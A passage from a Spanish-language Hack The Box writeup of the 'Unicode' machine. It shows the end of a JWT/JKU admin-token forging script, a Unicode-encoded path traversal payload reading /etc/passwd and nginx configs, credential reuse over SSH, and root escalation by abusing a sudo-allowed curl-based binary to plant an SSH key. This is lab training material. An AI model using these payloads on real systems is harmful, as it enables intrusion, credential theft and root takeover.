    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'python3'</span><span class="p">,</span> <span class="s">'-m'</span><span class="p">,</span> <span class="s">'http.server'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)])</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">gen_key</span><span class="p">()</span>
    <span class="n">download_json</span><span class="p">()</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">get_data_key</span><span class="p">()</span>
    <span class="n">create_json</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">admin_token</span> <span class="o">=</span> <span class="n">gen_token</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">printRed</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Admin token: "</span><span class="p">)</span>
    <span class="n">printGreen</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">admin_token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">listen_port</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
</pre></table></code></div></div><p>Pueden clonar el script en mi respositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/JKU-Header-Inyection_Unicode/exploit.py">https://github.com/E1P0TR0</a></p><p><img data-src="/assets/img/htb/writeups/unicode/exploit_admin_token.png" alt="EXPLOIT" class="shadow" data-proofer-ignore></p><p>Ejecutando el script y siguiendo los pasos anteriores ya estariamos logeados como <code class="language-plaintext highlighter-rouge">admin</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/dashboard_admin_page.png" alt="Http_admin_page" class="shadow" data-proofer-ignore></p><p>Después de toquetear un poco encontramos una sesión de reportes donde podemos observar que se utiliza un archivo <code class="language-plaintext highlighter-rouge">pdf</code> que proviene de otra locación:</p><p><img data-src="/assets/img/htb/writeups/unicode/report_page.png" alt="Http_admin_report" class="shadow" data-proofer-ignore></p><p>Podriamos estar frente a un <code class="language-plaintext highlighter-rouge">LFI (Local File Inclusion)</code>, y en específico a un <strong><code class="language-plaintext highlighter-rouge">path traversal attack</code></strong></p><p>Entonces intentamos un ataque básico al <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/basic_path_traversal_attack.png" alt="Http_admin_filter" class="shadow" data-proofer-ignore></p><p>Interesante!, pues al parecer exite un filtro. Pero otra vez, tomando el cuenta el nombre de la máquina <code class="language-plaintext highlighter-rouge">Unicode</code> podemos intentar buscar vulnerabilidades asociadas</p><p>Buscando en la biblia de los hackers <a href="https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability">Hacktricks</a> encontramos como engañar al filtro remplazando el caracter <code class="language-plaintext highlighter-rouge">\</code> por su equivalente en <strong>Unicode</strong> <code class="language-plaintext highlighter-rouge">%ef%bc%8f</code> y con ello crear el path malicioso para comprobar si es vulnerable: <code class="language-plaintext highlighter-rouge">..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/validation_path_traversal_attack.png" alt="Http_path_attack_validation" class="shadow" data-proofer-ignore></p><p><img data-src="/assets/img/htb/writeups/unicode/ffuf_path_attack_search.png" alt="Http_ffuf_scan" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-c : Output colorido</p><p>-mc &lt;status_code&gt; : Solo mostrar respuesta del código de estado asignado</p><p>-w &lt;wordlist&gt; : Wordlist a usar para el ataque de fuerza bruta</p><p>-b &lt;cookie&gt; : Asignar nuestra cookie de sessión</p><p>-u &lt;url&gt; : Url objetivo con el reemplazo del FUZZ correspondiente</p><p>-fw &lt;number&gt; : Filtrar por cantidad de palabras en la respuesta</p></blockquote><p>Pueden clonar la herramienta en el siguitent repositorio: <a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><p>No llegamos a encontrar nada interesante, pero sabemos que podemos buscar archivos del sistema. Por ello, intentamos encontrar archivos de configuración del servidor web/proxy <code class="language-plaintext highlighter-rouge">Nginx</code> que corre en el sistema</p><p>Investigando un buen tiempo encontramos algunos archivos de configuración de <code class="language-plaintext highlighter-rouge">Nginx</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/nginx_config_files.png" alt="Http_Nginx_config_files" class="shadow" data-proofer-ignore></p><p>En el primer archivo no encontramos nada interesante, pero en el segundo que es un directorio para alojar <code class="language-plaintext highlighter-rouge">Server block</code> encontramos en internet que hay uno por defecto llamado <code class="language-plaintext highlighter-rouge">default</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/nginx_server_block_default.png" alt="Http_Nginx_server_block" class="shadow" data-proofer-ignore></p><p>Ojito, al entrar encontramos un comentario sobre un cambio de contraseña de un usuario y se encuentra en un archivo <code class="language-plaintext highlighter-rouge">db.yaml</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/nginx_enable_server_block_default.png" alt="Http_Nginx_default_server_block_config" class="shadow" data-proofer-ignore></p><p>Observamos el path <code class="language-plaintext highlighter-rouge">/home/code/coder/static/styles/</code>, y el usuario <code class="language-plaintext highlighter-rouge">code</code> que anteriormente vimos en el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p><p>Entonces vamos buscando la locación del archivo <code class="language-plaintext highlighter-rouge">db.yaml</code>, logramos encontrarlo en <code class="language-plaintext highlighter-rouge">/home/code/coder/db.yaml</code> y son unas credenciales de <code class="language-plaintext highlighter-rouge">mysql</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/user_credentials.png" alt="User_credentials" class="shadow" data-proofer-ignore></p><p>Recordamos que tenemos el puerto <strong>SSH</strong> abierto, y como vemos que tenemos un <strong>usuario</strong> y <strong>contraseña</strong> probamos la credenciales encontradas como el usuario <code class="language-plaintext highlighter-rouge">code</code> y obtenemos la <strong>flag</strong>:</p><p><img data-src="/assets/img/htb/writeups/unicode/ssh_code_login.png" alt="Code_ssh_login" class="shadow" data-proofer-ignore></p><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Ya dentro como el usuario <code class="language-plaintext highlighter-rouge">code</code>, como es costumbre usamos scripts básicos para buscar binarios con permisos <strong>SUID</strong> <code class="language-plaintext highlighter-rouge">find \ -perm -4000 2&gt;/dev/null</code> o binarios que podemos ejecutar como <strong>root</strong> <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/binary_sudo_code_user.png" alt="Code_sudo_binary" class="shadow" data-proofer-ignore></p><p>Observamos que podemos ejecutar el binario <code class="language-plaintext highlighter-rouge">/usr/bin/treport</code> como root:</p><p><img data-src="/assets/img/htb/writeups/unicode/treport_binary.png" alt="Treport_binary" class="shadow" data-proofer-ignore></p><p>De las tres opciones la más interesante es la <strong>3.</strong> que nos permite descargar archivos.</p><p>Pero antes de eso debemos saber que está usando el binario por detrás para hacer las descargas. Para ello hay dos maneras:</p><ul><li>Insertar un campo vacío en la opción <strong>3</strong>:</ul><p><img data-src="/assets/img/htb/writeups/unicode/first_way_curl_treport.png" alt="Treport_detect_curl" class="shadow" data-proofer-ignore></p><ul><li>Insertar un campo vacío en la opción <strong>1</strong> y visualizando que hay un archivo en <code class="language-plaintext highlighter-rouge">python</code> usar una herramienta para extraer archivos en <code class="language-plaintext highlighter-rouge">python</code> <a href="https://github.com/LucifielHack/pyinstxtractor">pyinstxtractor</a> y luego otra herramienta para decompilarla, sea legible <a href="https://github.com/LucifielHack/pycdc">pycdc</a> y poder visualizar el archivo <code class="language-plaintext highlighter-rouge">treport.py</code>:</ul><p><img data-src="/assets/img/htb/writeups/unicode/second_way_curl_treport.png" alt="Treport_detect_curl" class="shadow" data-proofer-ignore></p><p><img data-src="/assets/img/htb/writeups/unicode/treport_python_code.png" alt="Treport_python_code" class="shadow" data-proofer-ignore></p><p>En ambos casos observamos que la herramienta que está por detrás es <code class="language-plaintext highlighter-rouge">curl</code>, asi que es posible que tengamos una brecha para escalar privilegios</p><p>Investigando un poco encontré que podemos descargar archivos del equipo local con <code class="language-plaintext highlighter-rouge">curl</code> usando el protocolo <strong>FILE</strong>:</p><p><img data-src="/assets/img/htb/writeups/unicode/curl_protocol.png" alt="Curl_Protocol" class="shadow" data-proofer-ignore></p><p>Usando el comando <code class="language-plaintext highlighter-rouge">File:///root/root.txt</code> podemos descargar la flag de root para luego visualizarla:</p><p><img data-src="/assets/img/htb/writeups/unicode/root_flag.png" alt="Flag_root" class="shadow" data-proofer-ignore></p><p>Pero lo que queremos es entrar como usuarios <code class="language-plaintext highlighter-rouge">root</code> asi que intenté leer si había una llave privada para entrar por <strong>SSH</strong>, pude obtenerla pero al entrar me pedía contraseña, asi que busqué otra manera.</p><p>Lo que hice fue crearme un par de llaves <code class="language-plaintext highlighter-rouge">rsa</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/generate_keys.png" alt="Keys_generate" class="shadow" data-proofer-ignore></p><p>Enviar la <em>llave pública</em> a la máquina víctima al directorio <code class="language-plaintext highlighter-rouge">/tmp</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/sharing_publickey.png" alt="Share_pubkey" class="shadow" data-proofer-ignore></p><p>Cambiar el nombre de la <em>llave pública</em> (id_rsa.pem) a <code class="language-plaintext highlighter-rouge">authorized_keys</code>, luego usando el binario <code class="language-plaintext highlighter-rouge">treport</code> junto a <code class="language-plaintext highlighter-rouge">curl</code> copiar el archivo a la ruta <code class="language-plaintext highlighter-rouge">/root/.ssh/</code> y así desde mi máquina entrar con la <strong>llave privada</strong> que también generé:</p><p><img data-src="/assets/img/htb/writeups/unicode/move_to_authorized_keys.png" alt="Move_authorized_keys" class="shadow" data-proofer-ignore></p><p>Verificamos el archivo <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/verify_authorized_keys.png" alt="Verify_authorized_keys" class="shadow" data-proofer-ignore></p><p>Observamos que se encuentra nuestra <em>llave pública</em>, así que ahora asignamos permisos a nuestra <em>llave privada</em>, nos logeamos como <code class="language-plaintext highlighter-rouge">root</code> por el puerto <strong>22</strong> por <code class="language-plaintext highlighter-rouge">ssh</code> y pa-dentro!:</p><p><img data-src="/assets/img/htb/writeups/unicode/pwned.png" alt="Pwned" class="shadow" data-proofer-ignore></p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/json/" class="post-tag no-text-decoration" >Json</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >Jwt</a> <a href="/tags/jku/" class="post-tag no-text-decoration" >Jku</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/nginx/" class="post-tag no-text-decoration" >Nginx</a> <a href="/tags/curl/" class="post-tag no-text-decoration" >curl</a> <a href="/tags/sudoers/" class="post-tag no-text-decoration" >Sudoers</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Unicode - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBUnicode/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Unicode - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBUnicode/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBUnicode/&amp;text=Hackthebox Writeup Unicode - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBZipping/"><div class="card-body"> <em class="timeago small" data-ts="1694710800" > 2023-09-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Zipping Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.229/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenS...</p></div></div></a></div><div class="card"> <a href="/posts/HTBOnly4You/"><div class="card-body"> <em class="timeago small" data-ts="1693155600" > 2023-08-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Only4You Report</h3><div class="text-muted small"><p> Only4you Report Information gathering Scope: 10.10.11.210/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh (secure shell protocol) Banner grab...</p></div></div></a></div><div class="card"> <a href="/posts/HTBFormat/"><div class="card-body"> <em class="timeago small" data-ts="1693501200" > 2023-08-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Format Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.213/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh (Secure Shell Protocol) Banner grabbing ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBShibboleth/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Shibboleth</p></a> <a href="/posts/HTBPaper/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Paper</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
